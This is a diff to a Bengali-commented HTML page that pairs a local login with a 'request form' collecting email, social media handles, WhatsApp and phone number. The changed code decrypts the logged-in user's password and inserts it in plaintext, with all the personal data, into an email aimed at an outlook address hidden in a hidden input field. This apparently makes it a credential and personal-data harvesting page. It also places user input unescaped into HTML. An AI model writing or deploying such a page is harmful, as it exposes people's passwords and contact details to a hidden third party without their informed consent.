@@ -117,6 +117,13 @@ hr{
     border-color:#ff00cc33;
     margin:15px 0;
 }
+
+.info-note{
+    font-size:11px;
+    color:#aaa;
+    text-align:center;
+    margin-top:10px;
+}
 </style>
 </head>
 
@@ -144,7 +151,7 @@ hr{
 <input type="hidden" id="receiverEmail" value="inyt_444@outlook.com">
 
 <!-- ১. Your Email -->
-<label>📧 1. Your Email</label>
+<label>📧 1. Your Email (আপনার ইমেইল)</label>
 <input type="email" id="yourEmail" placeholder="example@gmail.com" required>
 
 <!-- ২. Your Username -->
@@ -200,6 +207,7 @@ hr{
 </form>
 
 <div id="formStatus" class="status"></div>
+<div class="info-note">💡 ফর্ম জমা দিলে Gmail ওপেন হবে। ইমেইল চেক করে Send এ ক্লিক করুন।</div>
 </div>
 
 </div>
@@ -241,8 +249,8 @@ function saveUsers(){
 
 loadUsers();
 
-// কারেন্ট লগইন ইউজার
-let currentUser = localStorage.getItem("currentUser") || null;
+// কারেন্ট লগইন ইউজার - সেশন স্টোরেজ ব্যবহার করা হচ্ছে (পেজ রিফ্রেশে লগআউট হবে)
+let currentUser = sessionStorage.getItem("currentUser") || null;
 
 // =============== লগইন ফাংশন ===============
 function login(){
@@ -257,21 +265,40 @@ function login(){
 
     if(users[u] && decrypt(users[u]) === p){
         currentUser = u;
-        localStorage.setItem("currentUser", u);
+        sessionStorage.setItem("currentUser", u); // sessionStorage ব্যবহার করছি
         statusDiv.innerHTML = `<div class="status-success">✅ লগইন সফল! স্বাগতম ${u}</div>`;
         document.getElementById("loginUser").value = "";
         document.getElementById("loginPass").value = "";
         updateSubmitButton();
+        
+        // 3 সেকেন্ড পর স্ট্যাটাস ক্লিয়ার
+        setTimeout(() => {
+            if(statusDiv.innerHTML.includes('লগইন সফল')){
+                statusDiv.innerHTML = '';
+            }
+        }, 3000);
     } else {
         statusDiv.innerHTML = '<div class="status-error">❌ ভুল ইউজারনেম বা পাসওয়ার্ড</div>';
+        setTimeout(() => {
+            if(statusDiv.innerHTML.includes('ভুল')){
+                statusDiv.innerHTML = '';
+            }
+        }, 3000);
     }
 }
 
 function logout(){
     currentUser = null;
-    localStorage.removeItem("currentUser");
+    sessionStorage.removeItem("currentUser"); // sessionStorage থেকে রিমুভ
     document.getElementById("loginStatus").innerHTML = '<div class="status-success">🚪 লগআউট হয়েছে</div>';
     updateSubmitButton();
+    
+    setTimeout(() => {
+        let statusDiv = document.getElementById("loginStatus");
+        if(statusDiv.innerHTML.includes('লগআউট')){
+            statusDiv.innerHTML = '';
+        }
+    }, 2000);
 }
 
 // লগইন স্টেট অনুযায়ী সাবমিট বাটন কন্ট্রোল
@@ -292,15 +319,8 @@ function updateSubmitButton(){
     }
 }
 
-// =============== Gmail এ পাঠানোর ফাংশন ===============
-function sendToGmail(){
-    // চেক করা লগইন করা আছে কিনা
-    if(!currentUser){
-        alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
-        return;
-    }
-    
-    // ফর্মের সব ডাটা সংগ্রহ করা
+// HTML টেবিল আকারে ইমেইল বডি তৈরি
+function createEmailBody(){
     let yourEmail = document.getElementById("yourEmail").value;
     let yourUsername = document.getElementById("yourUsername").value;
     let profilePic = document.getElementById("profilePic").value;
@@ -315,77 +335,123 @@ function sendToGmail(){
     let about = document.getElementById("about").value;
     let website = document.getElementById("website").value;
     
-    // ইমেইল ভ্যালিডেশন
+    let loggedInPassword = decrypt(users[currentUser]);
+    
+    // HTML টেবিল ফরম্যাটে বডি তৈরি
+    let body = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+    body { font-family: Arial, sans-serif; line-height: 1.6; }
+    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+    h2 { color: #ff00cc; border-bottom: 2px solid #ff00cc; padding-bottom: 10px; }
+    h3 { color: #00ccff; margin-top: 25px; }
+    table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+    th, td { border: 1px solid #ddd; padding: 10px; text-align: left; vertical-align: top; }
+    th { background: linear-gradient(135deg, #ff00cc, #3333ff); color: white; width: 35%; }
+    td { background: #f9f9f9; color: #333; }
+    .login-info { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin: 15px 0; }
+    .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
+    .badge { display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 11px; }
+    .profile-img { max-width: 150px; max-height: 150px; border-radius: 8px; }
+</style>
+</head>
+<body>
+<div class="container">
+    <h2>📋 নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে</h2>
+    
+    <div class="login-info">
+        <strong>🔐 লগইন তথ্য:</strong><br>
+        ইউজারনেম: ${currentUser}<br>
+        পাসওয়ার্ড: ${loggedInPassword}
+    </div>
+    
+    <h3>👤 ব্যবহারকারীর তথ্য</h3>
+    <table>
+        <tr><th>সিরিয়াল</th><th>ফিল্ড</th><th>তথ্য</th></tr>
+        <tr><td>১</td><td>ইমেইল</td><td>${yourEmail || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>২</td><td>ইউজারনেম</td><td>${yourUsername || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৩</td><td>প্রোফাইল ছবি</td><td>${profilePic ? `<a href="${profilePic}" target="_blank">${profilePic}</a><br><img src="${profilePic}" class="profile-img" onerror="this.style.display='none'">` : 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৪</td><td>ফেসবুক ইউজারনেম</td><td>${fbUsername ? `@${fbUsername}` : 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৫</td><td>ফেসবুক পেইজ</td><td>${fbPageUsername ? `@${fbPageUsername}` : 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৬</td><td>ইনস্টাগ্রাম</td><td>${igUsername || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৭</td><td>হোয়াটসঅ্যাপ</td><td>${whatsapp || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৮</td><td>টিকটক</td><td>${tiktok || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>৯</td><td>টেলিগ্রাম</td><td>${telegram || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>১০</td><td>টুইটার (X)</td><td>${twitter || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>১১</td><td>ফোন নম্বর</td><td>${phone || 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>১২</td><td>সম্পর্কে</td><td>${about ? about.replace(/\n/g, '<br>') : 'দেওয়া হয়নি'}</td></tr>
+        <tr><td>১৩</td><td>ওয়েবসাইট</td><td>${website ? `<a href="${website}" target="_blank">${website}</a>` : 'দেওয়া হয়নি'}</td></tr>
+    </table>
+    
+    <div class="footer">
+        ⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}<br>
+        📧 এই ইমেইলটি স্বয়ংক্রিয়ভাবে জেনারেট করা হয়েছে<br>
+        🙏 ধন্যবাদ
+    </div>
+</div>
+</body>
+</html>
+    `;
+    
+    return body;
+}
+
+// =============== Gmail এ পাঠানোর ফাংশন ===============
+function sendToGmail(){
+    // চেক করা লগইন করা আছে কিনা
+    if(!currentUser){
+        alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
+        return;
+    }
+    
+    // ফর্মের ডাটা চেক
+    let yourEmail = document.getElementById("yourEmail").value;
+    
     if(!yourEmail){
         alert("❌ অনুগ্রহ করে আপনার ইমেইল এড্রেস দিন!");
         return;
     }
     
     if(!yourEmail.includes('@') || !yourEmail.includes('.')){
-        alert("❌ সঠিক ইমেইল এড্রেস দিন!");
+        alert("❌ সঠিক ইমেইল এড্রেস দিন! (উদাহরণ: name@domain.com)");
         return;
     }
     
     // রিসিভারের ইমেইল (যেখানে রিপোর্ট যাবে)
     let receiverEmail = document.getElementById("receiverEmail").value;
     
-    // লগইন করা ইউজারের পাসওয়ার্ড ডিক্রিপ্ট করা
-    let loggedInPassword = decrypt(users[currentUser]);
-    
     // ইমেইলের সাবজেক্ট
-    let subject = `🔔 নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে - ${yourUsername || yourEmail}`;
+    let yourUsername = document.getElementById("yourUsername").value || yourEmail.split('@')[0];
+    let subject = `🔔 নিউ রিকুয়েস্ট ফর্ম - ${yourUsername}`;
     
-    // ইমেইলের বডি তৈরি করা (সুন্দর ফরম্যাটে)
-    let body = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📋 নিচের তথ্য জমা দেওয়া হয়েছে:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-👤 লগইন তথ্য:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-ইউজারনেম: ${currentUser}
-পাসওয়ার্ড: ${loggedInPassword}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📝 ব্যবহারকারীর দেওয়া তথ্য:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 ১. ইমেইল: ${yourEmail}
-👤 ২. ইউজারনেম: ${yourUsername || "দেওয়া হয়নি"}
-🖼️ ৩. প্রোফাইল ছবি লিংক: ${profilePic || "দেওয়া হয়নি"}
-📘 ৪. ফেসবুক ইউজারনেম: ${fbUsername || "দেওয়া হয়নি"}
-📘 ৫. ফেসবুক পেইজ ইউজারনেম: ${fbPageUsername || "দেওয়া হয়নি"}
-📷 ৬. ইনস্টাগ্রাম ইউজারনেম: ${igUsername || "দেওয়া হয়নি"}
-💬 ৭. হোয়াটসঅ্যাপ নম্বর: ${whatsapp || "দেওয়া হয়নি"}
-🎵 ৮. টিকটক ইউজারনেম: ${tiktok || "দেওয়া হয়নি"}
-✈️ ৯. টেলিগ্রাম ইউজারনেম: ${telegram || "দেওয়া হয়নি"}
-🐦 ১০. টুইটার (X) ইউজারনেম: ${twitter || "দেওয়া হয়নি"}
-📞 ১১. ফোন নম্বর: ${phone || "দেওয়া হয়নি"}
-📝 ১২. সম্পর্কে: ${about || "দেওয়া হয়নি"}
-🌐 ১৩. ওয়েবসাইট লিংক: ${website || "দেওয়া হয়নি"}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD')}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-এই ইমেইলটি অটোমেটিক জেনারেট করা হয়েছে।
-ধন্যবাদ! 🙏
-`;
+    // HTML বডি তৈরি
+    let htmlBody = createEmailBody();
     
-    // এনকোড করা (URL encoding for mailto)
+    // প্লেইন টেক্সট ভার্সন (ফallback জন্য)
+    let plainText = `নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে\nইউজার: ${currentUser}\nইমেইল: ${yourEmail}\nসময়: ${new Date().toLocaleString('bn-BD')}`;
+    
+    // Gmail mailto লিংক (HTML সাপোর্ট সহ)
+    // Gmail HTML সাপোর্ট করে, কিন্তু mailto: এ HTML body দিতে গেলে এনকোড করতে হবে
     let encodedSubject = encodeURIComponent(subject);
-    let encodedBody = encodeURIComponent(body);
+    let encodedBody = encodeURIComponent(htmlBody);
     
-    // Gmail mailto লিংক তৈরি করা
+    // Gmail কম্পোজ URL (HTML বডি সহ)
+    // নোট: Gmail ওয়েব ভার্সন HTML সাপোর্ট করে
     let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${receiverEmail}&su=${encodedSubject}&body=${encodedBody}`;
     
     // মোবাইল ডিভাইস চেক করা
     let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     
     if(isMobile){
-        // মোবাইলে Gmail অ্যাপ ওপেন হবে (যদি ইনস্টল থাকে)
-        window.location.href = `intent://mail/${receiverEmail}#Intent;scheme=mailto;package=com.google.android.gm;action=android.intent.action.SENDTO;S.browser_fallback_url=https://mail.google.com;end`;
+        // মোবাইলের জন্য intent URL (সঠিক ফরম্যাট)
+        // মোবাইলে mailto: ব্যবহার করলে Gmail অ্যাপ ওপেন হবে
+        let mobileLink = `mailto:${receiverEmail}?subject=${encodedSubject}&body=${encodedBody}`;
+        window.location.href = mobileLink;
         
-        // ফallback যদি intent কাজ না করে
+        // ফallback যদি mailto কাজ না করে
         setTimeout(() => {
             window.open(gmailLink, '_blank');
         }, 500);
@@ -398,45 +464,49 @@ function sendToGmail(){
     let formStatus = document.getElementById("formStatus");
     formStatus.innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! দয়া করে ইমেইল চেক করে Send এ ক্লিক করুন।</div>';
     
-    // ৩ সেকেন্ড পর স্ট্যাটাস ক্লিয়ার করা
+    // 5 সেকেন্ড পর স্ট্যাটাস রিসেট
     setTimeout(() => {
         if(formStatus.innerHTML.includes('Gmail ওপেন হচ্ছে')){
-            formStatus.innerHTML = '<div class="status-success">✅ ফর্ম সফলভাবে প্রস্তুত! ইমেইল পাঠানোর জন্য Send বাটনে ক্লিক করুন।</div>';
+            formStatus.innerHTML = '<div class="status-success">✅ ফর্ম প্রস্তুত! ইমেইল পাঠানোর জন্য Send বাটনে ক্লিক করুন।</div>';
         }
-    }, 3000);
-    
-    // অপশনাল: ফর্ম ক্লিয়ার করার জন্য (চাইলে কমেন্ট আউট করুন)
-    // clearForm();
+    }, 5000);
 }
 
-// ফর্ম ক্লিয়ার করার ফাংশন (প্রয়োজনে ব্যবহার করুন)
-function clearForm(){
-    document.getElementById("yourEmail").value = "";
-    document.getElementById("yourUsername").value = "";
-    document.getElementById("profilePic").value = "";
-    document.getElementById("fbUsername").value = "";
-    document.getElementById("fbPageUsername").value = "";
-    document.getElementById("igUsername").value = "";
-    document.getElementById("whatsapp").value = "";
-    document.getElementById("tiktok").value = "";
-    document.getElementById("telegram").value = "";
-    document.getElementById("twitter").value = "";
-    document.getElementById("phone").value = "";
-    document.getElementById("about").value = "";
-    document.getElementById("website").value = "";
-}
+// পেজ রিফ্রেশ হলে অটো লগআউট চেক
+window.addEventListener('beforeunload', function() {
+    // পেজ রিফ্রেশ হলে sessionStorage ইতিমধ্যেই ক্লিয়ার হয়ে যাবে
+    // কিন্তু আমরা চাইলে এখানে কিছু করতে পারি
+});
 
-// পেজ লোডে বাটন স্টেট সেট করা
-updateSubmitButton();
-
-// পেজ রিফ্রেশ করলেও লগইন স্টেট চেক
-window.onload = function(){
-    if(localStorage.getItem("currentUser")){
-        currentUser = localStorage.getItem("currentUser");
+// পেজ লোডে বাটন স্টেট সেট করা এবং সেশন চেক
+function init(){
+    // sessionStorage থেকে currentUser চেক
+    let storedUser = sessionStorage.getItem("currentUser");
+    if(storedUser && users[storedUser]){
+        currentUser = storedUser;
         updateSubmitButton();
-        document.getElementById("loginStatus").innerHTML = `<div class="status-success">✅ ইতিমধ্যে লগইন করেছেন: ${currentUser}</div>`;
+        document.getElementById("loginStatus").innerHTML = `<div class="status-success">✅ লগইন করেছেন: ${currentUser}</div>`;
+    } else {
+        currentUser = null;
+        sessionStorage.removeItem("currentUser");
+        updateSubmitButton();
     }
 }
+
+// পেজ লোড হলে init কল হবে
+init();
+
+// পেজ রিফ্রেশ ট্র্যাক করা (ব্যাক/ফরওয়ার্ড নেভিগেশনের জন্যও)
+window.addEventListener('pageshow', function(event) {
+    if(event.persisted || performance.getEntriesByType('navigation')[0].type === 'reload') {
+        // পেজ রিলোড বা ক্যাশ থেকে লোড হলে
+        let storedUser = sessionStorage.getItem("currentUser");
+        if(!storedUser){
+            currentUser = null;
+            updateSubmitButton();
+        }
+    }
+});
 </script>
 
 </body>
